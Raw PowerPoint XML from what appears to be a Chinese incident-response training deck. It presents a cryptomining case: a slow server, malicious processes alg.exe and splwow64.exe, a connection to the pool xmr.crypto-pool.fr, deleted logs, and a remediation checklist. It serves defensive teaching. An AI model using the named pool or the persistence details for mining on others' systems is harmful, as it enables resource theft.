              <a:t>，对被感染机器进行安全扫描和病毒查杀；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>对系统进行补丁更新，封堵病毒传播途径；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>制定严格的口令策略，避免弱口令；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>结合备份的网站日志对网站应用全面代码审计，找出攻击者利用的漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>入口进行封堵；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>配合全流量设备（如天眼）对全网中存在的威胁进行分析，排查问题；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12079056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5538"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="65538"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="655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AF477B-ACF6-A340-90F1-BC6A96D5C44F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552"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67586" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="755576" y="2492896"/>
            <a:ext cx="7850981" cy="17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FontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>某公司近期发现服务器运行速度变慢主站无故出现打开缓慢甚至无法打开、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>状态</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>503</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>错误等现象，客户登录服务器后发现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>占用率在长时间保持</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>100%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>断网后服务器</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>下降恢复正常，尝试结束进程删除文件后重启服务器进程自动恢复</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="1858543"/>
            <a:ext cx="2549096" cy="5232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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>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）事件概述</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36239950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7586"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="67586"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="675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文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="395536" y="2348880"/>
            <a:ext cx="3456383"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Step1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应急响应人员到场了解情况后，通过查看系统进程后发现多个异常进程：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>alg.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>splwow64.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>通过对进程参数进行判断判定该进程是恶意挖矿程序该程序在工作时会导致</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>长时间高负荷运行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>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2060848"/>
            <a:ext cx="4881835" cy="3960932"/>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
        <p:nvSpPr>
          <p:cNvPr id="5" name="标题 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74AF477B-ACF6-A340-90F1-BC6A96D5C44F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="539552" y="761379"/>
            <a:ext cx="6513512" cy="4873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itchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="457200" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="914400" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="1371600" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="1828800" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>案例一</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="589770" y="1358588"/>
            <a:ext cx="2212465"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en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>）事件分析</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42044052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8610"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="68610"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="686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C53F73-2A70-194F-B078-2DE405BAEF57}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="76470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69634" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="319087" y="1601000"/>
            <a:ext cx="8620125" cy="966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sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step2:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>通过调用参数发现该挖矿程序会与远端矿池进行连接：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>xmr.crypto-pool.fr</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="组合 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="319087" y="2904711"/>
            <a:ext cx="7996238" cy="2934735"/>
            <a:chOff x="319087" y="2904711"/>
            <a:chExt cx="7996238" cy="2934735"/>
          </a:xfrm>
        </p:grpSpPr>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087" y="2904711"/>
              <a:ext cx="4319588" cy="2482454"/>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pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="图片 4" descr="../../Library/Containers/com.tencent.xinWeChat/Data/Library/Application%20Support/com.tencent.xinWeChat/2.0b4.0.9/f39e17da9696abde00d37413157e210a/Message/MessageTemp/9e20f478899dc29eb19741386f9343c8/Image/221507735691_.pic.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38675" y="3356992"/>
              <a:ext cx="3676650" cy="2482454"/>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644490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9634"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="69634"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6963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7FEFEC-1847-ED48-A11E-9288E018D2A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="553641" y="76079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70658" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5148064" y="1418217"/>
            <a:ext cx="3530501"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en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step3: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>结束程序以及删除启动项信息后重启发现系统恢复正常该挖矿程序没有自动加载。通过对文件分析发现该文件是由</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>alg.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>加载并运行的，通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>alg.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>植入时间可以发现植入时间为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2017/10/05</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>通过排查系统日志和安全日志发现已经被删除最早产生日志的时间为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2017/10/06</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>怀疑在黑客操作完成后删除了系统日志</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4"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2132856"/>
            <a:ext cx="4824536" cy="3233539"/>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1563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 presetClass="entr" presetSubtype="2" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
